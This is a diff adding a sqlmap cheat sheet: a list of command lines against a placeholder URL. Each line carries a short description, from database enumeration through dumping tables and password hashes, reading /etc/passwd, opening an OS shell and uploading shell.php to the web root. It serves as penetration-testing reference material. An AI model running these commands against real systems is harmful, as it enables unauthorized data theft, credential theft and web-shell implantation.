@@ -1,0 +1,74 @@
+[X] sqlmap Command List
+
+[\] sqlmap -u "http://site.com/page?id=1"
+[/] Basic SQL injection test
+
+[\] sqlmap -u "http://site.com/page?id=1" --batch
+[/] Run non‑interactive (auto‑yes)
+
+[\] sqlmap -u "http://site.com/page?id=1" --dbs
+[/] Enumerate databases
+
+[\] sqlmap -u "http://site.com/page?id=1" -D testdb --tables
+[/] List tables in a database
+
+[\] sqlmap -u "http://site.com/page?id=1" -D testdb -T users --columns
+[/] List columns in a table
+
+[\] sqlmap -u "http://site.com/page?id=1" -D testdb -T users --dump
+[/] Dump table contents
+
+[\] sqlmap -u "http://site.com/page?id=1" --current-user
+[/] Show current DB user
+
+[\] sqlmap -u "http://site.com/page?id=1" --current-db
+[/] Show current database
+
+[\] sqlmap -u "http://site.com/page?id=1" --is-dba
+[/] Check if DB user is admin
+
+[\] sqlmap -u "http://site.com/page?id=1" --users
+[/] Enumerate DB users
+
+[\] sqlmap -u "http://site.com/page?id=1" --passwords
+[/] Dump DB user password hashes
+
+[\] sqlmap -u "http://site.com/page?id=1" --roles
+[/] Enumerate DB roles
+
+[\] sqlmap -u "http://site.com/page?id=1" --privileges
+[/] Enumerate DB privileges
+
+[\] sqlmap -u "http://site.com/page?id=1" --os-shell
+[/] Attempt OS shell (authorized testing only)
+
+[\] sqlmap -u "http://site.com/page?id=1" --os-cmd "whoami"
+[/] Run OS command (authorized testing only)
+
+[\] sqlmap -u "http://site.com/page?id=1" --file-read "/etc/passwd"
+[/] Read file from server (authorized testing only)
+
+[\] sqlmap -u "http://site.com/page?id=1" --file-write shell.php --file-dest "/var/www/html/shell.php"
+[/] Upload file to server (authorized testing only)
+
+[\] sqlmap -u "http://site.com/page?id=1" --risk=3 --level=5
+[/] Increase test intensity
+
+[\] sqlmap -u "http://site.com/page?id=1" --tamper=space2comment
+[/] Use tamper script
+
+[\] sqlmap -r request.txt
+[/] Use raw HTTP request file
+
+[\] sqlmap -u "http://site.com/page?id=1" --cookie="PHPSESSID=123"
+[/] Use custom cookies
+
+[\] sqlmap -u "http://site.com/page?id=1" --proxy="http://127.0.0.1:8080"
+[/] Route traffic through proxy (e.g., Burp)
+
+[\] sqlmap -u "http://site.com/page?id=1" --threads=10
+[/] Use multithreading
+
+[\] sqlmap --update
+[/] Update sqlmap
+
